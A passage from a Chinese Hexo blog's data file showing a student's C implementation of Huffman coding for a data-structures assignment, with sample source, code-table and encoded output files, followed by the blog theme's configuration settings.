class=\"keyword\">void</span> <span class=\"title\">CrtHuffmanTree</span><span class=\"params\">(HuffmanTree *ht,<span class=\"keyword\">int</span> *w,<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m=<span class=\"number\">2</span>*n<span class=\"number\">-1</span>,i,s1,s2;</span><br><span class=\"line\">\t*ht\t=(HuffmanTree) <span class=\"built_in\">malloc</span>((m+<span class=\"number\">1</span>)*<span class=\"keyword\">sizeof</span>(HTNode));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t(*ht)[i].weight=w[i];</span><br><span class=\"line\">\t\t(*ht)[i].LChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].parent=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].RChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=n+<span class=\"number\">1</span>;i&lt;=m;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t(*ht)[i].weight=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].LChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].parent=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].RChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tFILE *fp;</span><br><span class=\"line\">\tfp=fopen(<span class=\"string\">&quot;Code.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;哈夫曼树为: \\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=n+<span class=\"number\">1</span>;i&lt;=m;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tSelect(ht,i<span class=\"number\">-1</span>,&amp;s1,&amp;s2);</span><br><span class=\"line\">\t\t(*ht)[s1].parent=i;</span><br><span class=\"line\">\t\t(*ht)[s2].parent=i;</span><br><span class=\"line\">\t\t(*ht)[i].LChild=s1;</span><br><span class=\"line\">\t\t(*ht)[i].RChild=s2;</span><br><span class=\"line\">\t\t(*ht)[i].weight=(*ht)[s1].weight +(*ht)[s2].weight;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;%d(%d,%d)\\n&quot;</span>,(*ht)[i].weight,(*ht)[s1].weight,(*ht)[s2].weight);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CrtHuffmanCode</span><span class=\"params\">(HuffmanTree *ht,HuffmanCode *hc,<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> *cd;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a[<span class=\"number\">100</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,start,p,w=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> c;</span><br><span class=\"line\">\thc=(HuffmanCode *)<span class=\"built_in\">malloc</span>((n+<span class=\"number\">1</span>)*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span> *));</span><br><span class=\"line\">\tcd=(<span class=\"keyword\">char</span> *) <span class=\"built_in\">malloc</span>(n*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>));</span><br><span class=\"line\">\tcd[n<span class=\"number\">-1</span>]=<span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta[i]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tstart=n - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(c=i,p=(*ht)[i].parent;p != <span class=\"number\">0</span>;c=p,p=(*ht)[p].parent)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>((*ht)[p].LChild==c)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcd[--start]=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">\t\t\t\ta[i]++;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcd[--start]=<span class=\"string\">&#x27;1&#x27;</span>;</span><br><span class=\"line\">\t\t\t\ta[i]++;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\thc[i]=(<span class=\"keyword\">char</span> *) <span class=\"built_in\">malloc</span>((n - start)*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>));</span><br><span class=\"line\">\t\t<span class=\"built_in\">strcpy</span>(hc[i],&amp;cd[start]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(cd);</span><br><span class=\"line\">\tFILE *fp,*sf,*rf;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> ch;</span><br><span class=\"line\">\tfp=fopen(<span class=\"string\">&quot;Code.txt&quot;</span>,<span class=\"string\">&quot;a+&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;权值为%d的字母%c的哈夫曼编码为：%s\\n&quot;</span>,(*ht)[i].weight,key[i],hc[i]);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t\tw+=(*ht)[i].weight*a[i];</span><br><span class=\"line\">\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;带权路径为：%d\\n&quot;</span>,w);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\tsf=fopen(<span class=\"string\">&quot;SourceFile.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\trf=fopen(<span class=\"string\">&quot;ResultFile.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">fscanf</span>(sf,<span class=\"string\">&quot;%c&quot;</span>,&amp;ch)!=EOF)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(key[i]==ch)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">fprintf</span>(rf,<span class=\"string\">&quot;%s&quot;</span>,hc[i]);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(sf);</span><br><span class=\"line\">\tfclose(rf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tHuffmanTree\tHT;</span><br><span class=\"line\">\tHuffmanCode\tHC;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> *w,i,N=<span class=\"number\">0</span>,S[<span class=\"number\">200</span>],k=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> ch;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(S,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(S));</span><br><span class=\"line\">\tFILE *fp;</span><br><span class=\"line\">\tfp=fopen(<span class=\"string\">&quot;SourceFile.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">fscanf</span>(fp,<span class=\"string\">&quot;%c&quot;</span>,&amp;ch)!=EOF)S[ch]++;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"string\">&#x27;A&#x27;</span>;i&lt;=<span class=\"string\">&#x27;Z&#x27;</span>;i++)<span class=\"keyword\">if</span>(S[i])N++;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\tw=(<span class=\"keyword\">int</span> *)<span class=\"built_in\">malloc</span>((N+<span class=\"number\">1</span>)*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"string\">&#x27;A&#x27;</span>;i&lt;=<span class=\"string\">&#x27;Z&#x27;</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(S[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tkey[++k]=i;</span><br><span class=\"line\">\t\t\tw[k]=S[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCrtHuffmanTree(&amp;HT,w,N);</span><br><span class=\"line\">\tCrtHuffmanCode(&amp;HT,&amp;HC,N);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><br/><br><strong>SourceFile.txt</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AAAAABBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCDDDDDDDDEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFGGGHHHHHHHHHHH</span><br></pre></td></tr></table></figure><br><br/><br><strong>Code.txt</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">哈夫曼树为: </span><br><span class=\"line\">8(3,5)</span><br><span class=\"line\">15(7,8)</span><br><span class=\"line\">19(8,11)</span><br><span class=\"line\">29(14,15)</span><br><span class=\"line\">40(19,21)</span><br><span class=\"line\">54(25,29)</span><br><span class=\"line\">94(40,54)</span><br><span class=\"line\"></span><br><span class=\"line\">权值为5的字母A的哈夫曼编码为：0001</span><br><span class=\"line\">权值为25的字母B的哈夫曼编码为：10</span><br><span class=\"line\">权值为7的字母C的哈夫曼编码为：1110</span><br><span class=\"line\">权值为8的字母D的哈夫曼编码为：1111</span><br><span class=\"line\">权值为14的字母E的哈夫曼编码为：110</span><br><span class=\"line\">权值为21的字母F的哈夫曼编码为：01</span><br><span class=\"line\">权值为3的字母G的哈夫曼编码为：0000</span><br><span class=\"line\">权值为11的字母H的哈夫曼编码为：001</span><br><span class=\"line\">带权路径为：259</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br><br/><br><strong>ResultFile.txt</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0001000100010001000110101010101010101010101010101010101010101010101010111011101110111011101110111011111111111111111111111111111111110110110110110110110110110110110110110110010101010101010101010101010101010101010101000000000000001001001001001001001001001001001</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":4046,"excerpt":"<h1 id=\"哈夫曼编码\"><a href=\"#哈夫曼编码\" class=\"headerlink\" title=\"哈夫曼编码\"></a>哈夫曼编码</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">char</span> key[<span class=\"number\">200</span>];</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> weight;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> parent,LChild,RChild;</span><br><span class=\"line\">&#125;HTNode,*HuffmanTree;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">char</span> *HuffmanCode;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Select</span><span class=\"params\">(HuffmanTree *ht,<span class=\"keyword\">int</span> n,<span class=\"keyword\">int</span> *s1,<span class=\"keyword\">int</span> *s2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,min;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmin=i;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>((*ht)[i].weight&lt;(*ht)[min].weight)</span><br><span class=\"line\">\t\t\t\tmin=i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*s1=min;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>&amp;&amp;i!=(*s1))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmin=i;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>&amp;&amp;i!=*s1)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>((*ht)[i].weight&lt;(*ht)[min].weight)</span><br><span class=\"line\">\t\t\t\tmin=i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*s2=min;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CrtHuffmanTree</span><span class=\"params\">(HuffmanTree *ht,<span class=\"keyword\">int</span> *w,<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m=<span class=\"number\">2</span>*n<span 